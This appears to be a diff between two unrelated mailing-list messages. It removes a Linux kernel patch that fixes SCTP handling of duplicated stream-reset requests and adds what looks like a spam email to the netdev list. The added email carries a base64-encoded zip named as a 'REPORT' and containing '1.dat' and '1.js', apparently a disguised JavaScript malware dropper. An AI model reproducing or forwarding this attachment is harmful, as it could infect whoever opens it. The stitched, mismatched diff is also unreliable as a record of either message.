@@ -1,79 +1,53 @@
-From: Xin Long <lucien.xin@gmail.com>
-Subject: [PATCH net-next 3/3] sctp: process duplicated strreset asoc request correctly
-Date: Sat, 15 Apr 2017 22:00:29 +0800
-Message-ID: <e6876cd61324e504915309b2801ed136fe50f9f3.1492264734.git.lucien.xin@gmail.com>
-References: <cover.1492264734.git.lucien.xin@gmail.com>
- <a636da822b3db12479ce67e3976f43e2bc998517.1492264734.git.lucien.xin@gmail.com>
- <d66876c7fc8ad4b236f2c44dc5b624bff2fd1299.1492264734.git.lucien.xin@gmail.com>
-Cc: Marcelo Ricardo Leitner <marcelo.leitner@gmail.com>,
-        Neil Horman <nhorman@tuxdriver.com>, davem@davemloft.net
-To: network dev <netdev@vger.kernel.org>, linux-sctp@vger.kernel.org
+From: <energi@aaengineering.se>
+Subject: (unknown)
+Date: Sat, 15 Apr 2017 14:07:39 -0000
+Message-ID: <149226525982.8153.13401719055313566631@rima-tde.net>
+Mime-Version: 1.0
+Content-Type: application/zip; name="REPORT_717717110_netdev.zip"
+Content-Transfer-Encoding: base64
+To: "netdev" <netdev@vger.kernel.org>
 Return-path: <netdev-owner@vger.kernel.org>
-Received: from mail-pg0-f65.google.com ([74.125.83.65]:36749 "EHLO
-        mail-pg0-f65.google.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-        with ESMTP id S1753827AbdDOOBC (ORCPT
-        <rfc822;netdev@vger.kernel.org>); Sat, 15 Apr 2017 10:01:02 -0400
-In-Reply-To: <d66876c7fc8ad4b236f2c44dc5b624bff2fd1299.1492264734.git.lucien.xin@gmail.com>
-In-Reply-To: <cover.1492264734.git.lucien.xin@gmail.com>
-References: <cover.1492264734.git.lucien.xin@gmail.com>
+Received: from 155.red-79-144-214.dynamicip.rima-tde.net ([79.144.214.155]:60411
+        "HELO rima-tde.net" rhost-flags-OK-OK-OK-FAIL) by vger.kernel.org
+        with SMTP id S1754043AbdDOOHo (ORCPT
+        <rfc822;netdev@vger.kernel.org>); Sat, 15 Apr 2017 10:07:44 -0400
+Subject: 
+Content-Disposition: attachment
 Sender: netdev-owner@vger.kernel.org
 List-ID: <netdev.vger.kernel.org>
 
-This patch is to fix the replay attack issue for strreset asoc requests.
-
-When a duplicated strreset asoc request is received, reply it with bad
-seqno if it's seqno < asoc->strreset_inseq - 2, and reply it with the
-result saved in asoc if it's seqno >= asoc->strreset_inseq - 2.
-
-But note that if the result saved in asoc is performed, the sender's next
-tsn and receiver's next tsn for the response chunk should be set. It's
-safe to get them from asoc. Because if it's changed, which means the peer
-has received the response already, the new response with wrong tsn won't
-be accepted by peer.
-
-Signed-off-by: Xin Long <lucien.xin@gmail.com>
----
- net/sctp/stream.c | 19 +++++++++++++++----
- 1 file changed, 15 insertions(+), 4 deletions(-)
-
-diff --git a/net/sctp/stream.c b/net/sctp/stream.c
-index c91d97e..dda53a2 100644
---- a/net/sctp/stream.c
-+++ b/net/sctp/stream.c
-@@ -529,12 +529,21 @@ struct sctp_chunk *sctp_process_strreset_tsnreq(
- 	__u16 i;
- 
- 	request_seq = ntohl(tsnreq->request_seq);
--	if (request_seq > asoc->strreset_inseq) {
-+	if (TSN_lt(asoc->strreset_inseq, request_seq) ||
-+	    TSN_lt(request_seq, asoc->strreset_inseq - 2)) {
- 		result = SCTP_STRRESET_ERR_BAD_SEQNO;
--		goto out;
--	} else if (request_seq == asoc->strreset_inseq) {
--		asoc->strreset_inseq++;
-+		goto err;
-+	} else if (TSN_lt(request_seq, asoc->strreset_inseq)) {
-+		i = asoc->strreset_inseq - request_seq - 1;
-+		result = asoc->strreset_result[i];
-+		if (result == SCTP_STRRESET_PERFORMED) {
-+			next_tsn = asoc->next_tsn;
-+			init_tsn =
-+				sctp_tsnmap_get_ctsn(&asoc->peer.tsn_map) + 1;
-+		}
-+		goto err;
- 	}
-+	asoc->strreset_inseq++;
- 
- 	if (!(asoc->strreset_enable & SCTP_ENABLE_RESET_ASSOC_REQ))
- 		goto out;
-@@ -591,6 +600,8 @@ struct sctp_chunk *sctp_process_strreset_tsnreq(
- 						    next_tsn, GFP_ATOMIC);
- 
- out:
-+	sctp_update_strreset_result(asoc, result);
-+err:
- 	return sctp_make_strreset_tsnresp(asoc, result, request_seq,
- 					  next_tsn, init_tsn);
- }
--- 
-2.1.0
+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
